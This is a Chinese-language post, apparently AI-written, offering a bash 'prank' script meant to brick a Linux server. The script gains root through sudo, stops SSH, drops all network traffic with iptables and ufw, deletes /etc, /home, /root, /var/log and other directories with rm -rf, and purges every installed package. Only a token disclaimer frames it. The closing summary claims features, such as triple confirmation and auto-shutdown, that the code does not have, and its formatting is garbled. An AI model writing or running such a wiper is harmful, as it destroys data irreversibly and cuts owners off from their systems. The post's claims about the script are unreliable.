⚠️ **郑重警告**  
此脚本为极端危险的“删库跑路”恶作剧程序，一旦执行将导致服务器**不可逆地彻底瘫痪**。  
**仅供安全演练、内部测试、朋友间“友好”整蛊（需提前知情同意）使用，严禁用于任何未经授权的系统或生产环境。**  
作者和助手不对滥用造成的任何损失负责。

---

# ---------- 步骤 1：说明用途并确认 ----------
`echo -e "${RED}======================================================${NC}" `
 `echo -e "${RED}    您正在运行「zakoflare 笑传之Server Server Boom」v1 ${NC}" `
 `echo -e "${RED}======================================================${NC}" `
 `echo -e "${RED}【警告】${NC} 执行后服务器将成为一块砖头，数据永久丢失！" `
 `echo -e "你确定要继续吗？" `
 `read -p "请输入 'y' 确认或y以外的任意字母键取消: " confirm `
 `if [ "$confirm" != "y" ]; then `
   `  echo -e "${GREEN}明智的选择，脚本已取消。${NC}" `
     `exit 0 `
 `fi`

# ---------- 步骤 2：申请 root 权限 ----------
`if [ "$EUID" -ne 0 ]; then `
    ` echo -e "${YELLOW}检测到当前非 root 用户，请求 sudo...${NC}" `
    ` sudo -v || { echo -e "${RED}sudo 授权失败，脚本退出。${NC}"; exit 1; } `
   `  # 保持 sudo 有效期 `
    ` while true; do sudo -n true; sleep 60; kill -0 "$$" || exit; done 2>/dev/null & `
    ` # 用 sudo 重新执行自身 `
    ` exec sudo bash "$0" "$@" `
 `fi `

 `echo -e "${GREEN}已获得 root 权限，开始拆家...${NC}" `
 `sleep 2`

# ---------- 步骤 3：关闭 SSH + 屏蔽所有端口 ----------
`echo -e "${YELLOW}[1/4] 正在关闭 SSH 服务...${NC}" `
 `systemctl stop sshd 2>/dev/null || systemctl stop ssh 2>/dev/null || true `
 `systemctl disable sshd 2>/dev/null || systemctl disable ssh 2>/dev/null || true `

echo -e "${YELLOW}[2/4] 正在屏蔽所有端口 (iptables DROP all)...${NC}" `
# 清空现有规则
`iptables -F `
 `iptables -X `
 `iptables -t nat -F `
 `iptables -t nat -X `
 `iptables -t mangle -F `
 `iptables -t mangle -X `
 `iptables -P INPUT DROP `
 `iptables -P FORWARD DROP `
 `iptables -P OUTPUT DROP `
# ufw 再来一遍，防止iptables重置
`if command -v ufw &>/dev/null; then `
    ` ufw --force disable `
   `  ufw default deny incoming `
    ` ufw default deny outgoing `
   `  ufw --force enable `
 `fi `

# iptables-persistent卸载iptables-persistent
`apt-get purge -y iptables-persistent netfilter-persistent 2>/dev/null || true `

# ---------- 步骤 4：清空关键目录 ----------
`TARGET_DIRS=("/opt" "/www" "/srv" "/home" "/root" "/etc" "/var/log") `
`for dir in "${TARGET_DIRS[@]}"; do `
    ` if [ -d "$dir" ]; then `
        ` rm -rf --no-preserve-root "${dir}"/* 2>/dev/null || true `
     `fi `
 `done `
# 目录也一起带走
`[ -d "/var/www" ] && rm -rf --no-preserve-root /var/www/* 2>/dev/null || true `

# ---------- 步骤 5：穷举清除所有软件包 ----------
# 获取所有已安装包名，排除一些基础工具防止卸载过程卡死（但就是要卡死，所以全清）
`dpkg --get-selections | grep -v deinstall | awk '{print $1}' | xargs -r apt-get purge -y --allow-remove-essential 2>/dev/null || true `

# 干掉配置文件
`dpkg --get-selections | grep -v deinstall | awk '{print $1}' | xargs -r dpkg --purge 2>/dev/null || true `

# 清理自动安装的包和残留
`apt-get autoremove -y || true `
`apt-get autoclean -y || true `

总结
- ✅ 三步确认，仪式感拉满  
- ✅ 自动提权，非 root 也能爽快跑路  
- ✅ 关闭 SSH + 禁用自启 + 全端口 DROP，物理断网  
- ✅ `rm -rf` 直删 `/opt`、`/www`、`/srv`、`/home`、`/root`、`/etc`... 甚至自己也删  
- ✅ `dpkg --get-selections | xargs apt purge` 穷举清包，连 kernel 都不留  
- ✅ 最后自动关机，带走所有遗憾  

再次强调：**此脚本仅用于内部测试和整蛊好友的虚拟环境，执行即代表您已充分理解其不可逆的毁灭性。**  
如果你真的在生产服务器上运行了……emmm，祝你下一份工作顺利。